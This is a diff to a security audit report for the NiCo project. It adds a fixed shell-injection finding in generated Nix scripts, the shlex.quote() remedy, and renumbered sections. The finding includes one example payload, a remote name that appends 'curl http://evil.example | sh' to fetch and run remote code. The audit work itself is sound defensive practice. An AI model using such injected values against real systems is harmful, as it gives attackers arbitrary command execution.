@@ -1,6 +1,6 @@
 # Security Audit – NiCo
 
-**Date:** 2026-04-26  
+**Date:** 2026-04-26 · **Last updated:** 2026-05-09  
 **Auditor:** Claude Code (claude-sonnet-4-6)  
 **Scope:** `nico/` and `testing/` directories (7818 LOC)
 
@@ -129,7 +129,33 @@ All file-write endpoints were reviewed:
 
 ---
 
-### 4.4 CSRF Protection ✅ OK
+### 4.4 Shell Injection via Flatpak Remote Data in Generated Nix Script ✅ FIXED (2026-05-09)
+
+**File:** `nico/generator.py` (two locations, `generate_configuration_nix` and `generate_host_nix`)
+
+**Finding:** Flatpak remote `name` and `url` values entered by the user were interpolated unescaped into a Nix multiline string used as the `script` attribute of a `systemd.services.flatpak-repo` block:
+
+```python
+# Before fix – unsafe
+f"      flatpak remote-add --if-not-exists {r['name']} {r['url']}"
+```
+
+The generated Nix expression is written to disk and later executed by systemd as a shell script. A malicious remote name such as `flathub; curl http://evil.example | sh #` would result in arbitrary shell command execution during NixOS activation.
+
+**Mitigating factors:** App binds to `127.0.0.1` only; CSRF protection is active. Exploitation required either local access or a CSRF bypass.
+
+**Fix applied:**
+
+```python
+import shlex
+f"      flatpak remote-add --if-not-exists {shlex.quote(r['name'])} {shlex.quote(r['url'])}"
+```
+
+`shlex.quote()` wraps values in single quotes and escapes embedded single quotes, neutralising all shell metacharacters.
+
+---
+
+### 4.5 CSRF Protection ✅ OK
 
 - Token generated with `secrets.token_hex(32)` per session
 - Compared with `secrets.compare_digest()` (constant-time, no timing attacks)
@@ -138,7 +164,7 @@ All file-write endpoints were reviewed:
 
 ---
 
-### 4.5 Network Exposure ✅ OK
+### 4.6 Network Exposure ✅ OK
 
 - Server binds to `127.0.0.1` only (`HOST = "127.0.0.1"` hardcoded in `main.py`)
 - No telemetry, no remote calls initiated by the server
@@ -156,8 +182,9 @@ All file-write endpoints were reviewed:
 | 5 | Low | B101: `assert` in test fixture code under `testing/` | ✅ Informational |
 | 6 | Info | No CVEs in dependencies | ✅ Clean |
 | 7 | Fixed | `_modify_brick_in_file` path traversal | ✅ Re-verified fixed |
+| 8 | Medium → Fixed | Shell injection via Flatpak remote name/URL in generated Nix script | ✅ Fixed 2026-05-09 with `shlex.quote()` |
 
-**Highest real risk:** No currently confirmed medium/high exploitable issue in the audited scope. The previous brick path traversal was re-verified as fixed on 2026-04-26.
+**Highest real risk:** No currently confirmed medium/high exploitable issue in the audited scope.
 
 ---
 
